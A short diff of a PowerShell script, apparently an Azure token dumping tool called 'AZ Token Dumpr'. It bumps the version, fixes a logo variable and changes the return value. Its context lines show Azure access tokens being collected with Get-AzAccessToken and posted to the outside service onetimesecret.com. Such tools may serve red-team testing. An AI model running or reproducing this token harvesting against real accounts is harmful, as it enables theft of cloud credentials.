@@ -28,7 +28,7 @@ function AccessToken {
     param (
         $receiptEmail = "r.dijkman@securehats.nl",
         $passphrase = "",
-        $version = '1.1.0'
+        $version = '1.1.1'
     )
 
     if (-not(Get-Module -Name 'Az.Accounts')) {
@@ -58,7 +58,7 @@ $logo = @"
   --- AZ Token Dumpr v$version ---
 "@
 
-        Write-Host $logo2
+        Write-Host $logo
         foreach ($resourceTypeName in $resourceTypeNames) {
             try {
                 $accessToken = (Get-AzAccessToken -ResourceTypeName $resourceTypeName -AsSecureString -ErrorAction SilentlyContinue)
@@ -90,7 +90,7 @@ $logo = @"
         }
 
         $response = Invoke-RestMethod @requestParam
-        return "https://us.onetimesecret.com/secret/$($response.secret_key)"
+        return $response #"https://us.onetimesecret.com/secret/$($response.secret_key)"
     }
     catch {
         Write-Error "An error occurred in function $($MyInvocation.MyCommand.Name): $($_.Exception.Message)"
